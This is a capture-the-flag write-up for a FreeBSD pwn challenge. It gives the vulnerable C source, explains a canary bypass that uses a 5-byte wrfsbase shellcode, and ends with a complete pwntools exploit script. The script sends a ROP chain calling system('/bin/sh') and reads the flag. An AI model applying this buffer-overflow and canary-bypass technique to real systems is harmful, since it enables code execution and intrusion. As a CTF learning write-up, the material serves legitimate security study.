# ez

Author: plonk

Category: pwn

Solves: 18

Points: 460

We give you shellcode, we give you A Single Leak Required (well, 2), but you won't need them anyways, we give you ROP,

should be easy, right?

## Challenge

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <assert.h>
#include <fcntl.h>
#include <dlfcn.h>

#define ASLR_ENTROPEH 3 // should be enough...
#define MORETIME 23 // because illuminati
#define LONGNESS 64 // cause that's how long a long long is

// These are just some utility macros for the shellcoding part.
#define PUSH(reg) "push %" #reg "\n"
#define POP(reg) "pop %" #reg "\n"
#define CLEAR(reg) "xor %" #reg ", %" # reg "\n"

#define PUSH_ALL() do { asm volatile ( \
      PUSH(rax) PUSH(rbx) PUSH(rcx) PUSH(rdx) \
      PUSH(rsi) PUSH(rdi) \
      PUSH(r8) PUSH(r9) PUSH(r10) PUSH(r11) \
      PUSH(r12) PUSH(r13) PUSH(r14) PUSH(r15) \
      PUSH(rbp) \
      ); } while(0)

#define POP_ALL() do { asm volatile ( \
      "1:\n" \
      POP(rbp) \
      POP(r15) POP(r14) POP(r13) POP(r12) \
      POP(r11) POP(r10) POP(r9) POP(r8) \
      POP(rdi) POP(rsi) \
      POP(rdx) POP(rcx) POP(rbx) POP(rax) \
    ); } while(0)

long read_long() {
  char buf[LONGNESS];
  bzero(buf, LONGNESS);
  for (unsigned char i = 0; i < LONGNESS; i++) {
    if ((read(STDIN_FILENO, buf+i, 1) != 1) || (buf[i] == '\n')) {
      buf[i] = 0;
      break;
    }
  }
  return strtol(buf, NULL, 10);
}

__attribute__((always_inline))
inline void do_shellcode() {
  // Wanna try shellcoding? Here you go!
  char *playground = NULL;
  int urandom = -1;

  // We even roll our own ASLR for MAXIMUM SEKURITEH!
  urandom = open("/dev/urandom", O_RDONLY);
  if (urandom == -1) {
    perror("YNORANDOMNESS?!");
    exit(1);
  }

  if (read(urandom, &playground, ASLR_ENTROPEH) == -1) {
    perror("NEED MOAR ENTROPEH");
    exit(1);
  }
  close(urandom);
  // XXX: check if close() failed...

  // Make sure we're page-aligned
  playground = (char*) ((unsigned long long) playground << 12);

  // No 32-bit magic!
  playground = (char*) ((unsigned long long) playground | (1UL<<33));

  playground = mmap(playground,
      1 << 12,
      PROT_READ | PROT_WRITE | PROT_EXEC,
      MAP_PRIVATE | MAP_ANON | MAP_EXCL | MAP_FIXED,
      -1,
      0);

  if (playground == MAP_FAILED) {
    perror("RESPECT MAH MMAP");
    exit(1);
  }

  puts("All your shellcode are belong to us!\n");
  read(STDIN_FILENO, playground, 0x5);

  // In case your shellcode gets lost, here's the way back:
  memcpy(playground+0x5, "H\xb8", 2); // mov rax
  memcpy(playground+0xf, "H\xbc", 2); // mov rsp
  memcpy(playground+0x19, "\xff\xe0", 2); // jmp rax

  // Push ALL THE THINGS!!!11elf
  PUSH_ALL();

  // Clear ALL THE THINGS!!! *well nearly...
  asm volatile(
      CLEAR(rsi) CLEAR(rdi)
      CLEAR(r8) CLEAR(r9) CLEAR(r10) CLEAR(r11)
      CLEAR(r12) CLEAR(r13) CLEAR(r14) CLEAR(r15)
      CLEAR(rbx) CLEAR(rcx) CLEAR(rdx)
  );

  asm volatile(
      "movabs $1f, %%rdx\n"
      "mov %%rdx, 0x7(%%rax)\n"
      "mov %%rsp, 0x11(%%rax)\n"
      "xor %%rdx, %%rdx\n"
      "xor %%rbp, %%rbp\n"
      "xor %%rsp, %%rsp\n"
      "jmp *%0\n"
      :: "a"(playground) :
  );

  // Pop ALL TEH THINGS!!!
  POP_ALL();
}

__attribute__((always_inline))
inline void do_rop() {
  char ropmebaby[1*MORETIME];
  long smells_fishy = 0;

  printf("yay, you didn't crash this thing! Have a pointer, you may need it: %p\n", dlsym(RTLD_NEXT, "system"));

  printf("You shouldn't need this pointer, but this is an easy challenge: %p\n", &ropmebaby[0]);
  fflush(stdout);

  printf("How much is the fish?\n");
  fflush(stdout);
  smells_fishy = read_long();
  printf("Okay, gimme your %ld bytes of ropchain!\n", smells_fishy);
  fflush(stdout);
  read(STDIN_FILENO, ropmebaby, smells_fishy);
}

int main() {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  do_shellcode();
  do_rop();
  return 0;
}
```

The binary provided with this C code was compiled for FreeBSD.
This meant we first had to set up a FreeBSD VM we could use to actually run and interact with this binary. (Thanks plonk >:C)

This challenge does 3 things:

1. You provide it with 5 bytes of shellcode which will get executed.

```c
// ...

puts("All your shellcode are belong to us!\n");
read(STDIN_FILENO, playground, 0x5);

// In case your shellcode gets lost, here's the way back:
memcpy(playground+0x5, "H\xb8", 2); // mov rax
memcpy(playground+0xf, "H\xbc", 2); // mov rsp
memcpy(playground+0x19, "\xff\xe0", 2); // jmp rax

// ...

asm volatile(
    "movabs $1f, %%rdx\n"
    "mov %%rdx, 0x7(%%rax)\n"
    "mov %%rsp, 0x11(%%rax)\n"
    "xor %%rdx, %%rdx\n"
    "xor %%rbp, %%rbp\n"
    "xor %%rsp, %%rsp\n"
    "jmp *%0\n"
    :: "a"(playground) :
);

// ...
```

2. When the shellcode succeeded the binary provides you with a pointer to system and the address for a buffer on the stack

```c
printf("yay, you didn't crash this thing! Have a pointer, you may need it: %p\n", dlsym(RTLD_NEXT, "system"));

printf("You shouldn't need this pointer, but this is an easy challenge: %p\n", &ropmebaby[0]);
```

3. You provide the binary with a number bytes and a string of that length which are simply being read

```c
printf("How much is the fish?\n");
fflush(stdout);
smells_fishy = read_long();
printf("Okay, gimme your %ld bytes of ropchain!\n", smells_fishy);
fflush(stdout);
read(STDIN_FILENO, ropmebaby, smells_fishy);
```

## Solution

Everything in this binary screams ROP (`gimme your %ld bytes of ropchain`, `ropmebaby`, `do_rop`) so this will be our ultimate goal. 
It is also pretty obvious how and where to place the ROP chain, as you provide the binary the length of the string you are about to send and with that you can overrun the buffer on the stack. 
This is a by the books buffer overflow. 
The only problem here is the stack canary.

```
[*] '/home/liikt/AGRS/2019/tasteless/ez/ez'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

We have no way of leaking the canary so we can't know it's value.
We do have the 5 byte of shellcode at the start, but 5 byte is hardly enough for 2 useful instructions.
So that doesn't help
The canary is a value stored in memory and pointed to by a segment register (in this case the `fs` register). 
Usually this register is protected and can only be accessed if the CPU is in a more privileged mode than the user mode.
So a user shouldn't be able to change the content of the `fs_base` register and subsequently change the pointer to the canary.
This surely has to be a protected register.

Enter `wrfsbase` and `wrgsbase`. 
According to [this gist](https://gist.github.com/MerryMage/f22e75d5128c07d77630ca01c4272937) FreeBSD just doesn't care if the segment registers are changed.

Okay but how does this help?
Well remember the 5 byte of shellcode we could write? 
As it turns out the 64 bit versions of the `wr(f|g)sbase` instructions are exactly 5 byte long. 
Coincidence? 
I think not!

`wrfsbase` takes a register as it's only argument and write it's content into the `fs_base` register.
Thus whatever the register pointed to will become the new stack canary.

```c

#define CLEAR(reg) "xor %" #reg ", %" # reg "\n"

// ...

asm volatile(
    CLEAR(rsi) CLEAR(rdi)
    CLEAR(r8) CLEAR(r9) CLEAR(r10) CLEAR(r11)
    CLEAR(r12) CLEAR(r13) CLEAR(r14) CLEAR(r15)
    CLEAR(rbx) CLEAR(rcx) CLEAR(rdx)
);

asm volatile(
    "movabs $1f, %%rdx\n"
    "mov %%rdx, 0x7(%%rax)\n"
    "mov %%rsp, 0x11(%%rax)\n"
    "xor %%rdx, %%rdx\n"
    "xor %%rbp, %%rbp\n"
    "xor %%rsp, %%rsp\n"
    "jmp *%0\n"
    :: "a"(playground) :
);
```

Just before we are about to execute the shellcode however every register is cleared, apart from `rax` which contains the pointer to our `playground` and `rip` for obvious reasons.
This leaves us with the `rax` and `rip` register as candidates for our new `fs_base` pointer.
Since we control what `rax` is pointing to we chose `rax` as our lucky register.
And because the canary ~~doesn't~~ shouldn't change over the course of an execution we do know what the canary will be by the time we are writing our rop chain.

```python
io.recvuntil("All your shellcode are belong to us!\n")
shellcode = "\xf3\x48\x0f\xae\xd0" # wrfsbase rax
io.send(shellcode)
```

The rest is shockingly straight forward. 
We get a pointer to system and a pointer to the top of our buffer we are going to fill, we can fabricate a `/bin/sh` pointer by just putting it at the start of the buffer and then build a simple rop chain. 

```python
payload = "/bin/sh\0" + \               # /bin/sh string
    "\0" * 8 * 2 + \                    # padding
    "\xf3\x48\x0f\xae\xd0H\xb8\xc5" + \ # the canary (first 8 byte of playground)
    "\0" * 8 * 1 + \                    # bogus rbp for `leave`
    p64(0x400b3e) + \                   # pop rax; pop r[^a]x
    p64(stack) + \                      # addr to `/bin/sh`
    p64(0) + \                          # bogus value for r[^a]x register
    p64(system)                         # call system
```

## Script

```python
from pwn import *
from hashlib import sha1

def proof(t, prefix):
    i = 0
    while True:
        if sha1(str(t + str(i)).encode()).hexdigest().startswith(prefix):
            return str(i)
        i += 1

io = remote("hitme.tasteless.eu", 10801)
pow_chal = io.readuntil("...").split("(")[1].split(",")[0]

res = proof(pow_chal, "00000")
io.sendline(res)
io.recvuntil("All your shellcode are belong to us!\n")
shellcode = "\xf3\x48\x0f\xae\xd0"
io.send(shellcode)

io.recvuntil("you may need it: ")
system = int(io.recvline().strip(), 16)
io.recvuntil(": ")
stack = int(io.recvline().strip(), 16)

log.info("system @ : " + hex(system))
log.info("stack @ : " + hex(stack))

io.recvuntil("fish?\n")
payload = "/bin/sh\0" + "\0" * 8 * 2 + "\xf3\x48\x0f\xae\xd0H\xb8\xc5" + "\0" * 8 * 1 + p64(0x400b3e) + p64(stack) + p64(0) + p64(system)
io.sendline(str(len(payload)))
io.recvuntil("ropchain!")
io.send(payload)
io.sendline("cat flag.txt")
flag = io.recvuntil("}").strip()
log.info("Flag : {}".format(flag))
```